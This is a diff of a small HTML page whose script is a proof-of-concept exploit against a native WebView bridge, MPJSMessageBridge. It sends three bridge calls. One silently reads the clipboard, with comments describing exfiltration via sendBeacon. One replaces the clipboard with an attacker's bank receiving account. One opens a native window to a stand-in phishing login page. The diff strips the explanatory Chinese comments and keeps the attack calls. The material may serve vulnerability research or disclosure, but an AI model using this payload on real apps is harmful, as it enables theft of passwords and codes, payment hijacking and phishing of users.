@@ -1,21 +1,16 @@
 <html>
-  <meta charset="utf-8">
 <body>
 
 <script>
-// 1) 静默读取剪贴板（验证码/密码/草稿）并外传
 MPJSMessageBridge.postMessage(JSON.stringify({
   key: "getClipboardData", requestId: "r1", data: {}
 }));
-// 原生通过 responseId 回调网页注册的处理函数，攻击者在回调里 sendBeacon 外泄
 
-// 2) 收款账号劫持：把用户剪贴板替换为攻击者账号
 MPJSMessageBridge.postMessage(JSON.stringify({
   key: "setClipboardData", requestId: "r2",
   data: { data: "攻击者收款账号 6222xxxxxxxx" }
 }));
 
-// 3) 开放重定向钓鱼 / 触达原生路由
 MPJSMessageBridge.postMessage(JSON.stringify({
   key: "WNNativeCallbackOpenNewWindow", requestId: "r3",
   data: { url: "https://phishing.example/login" }
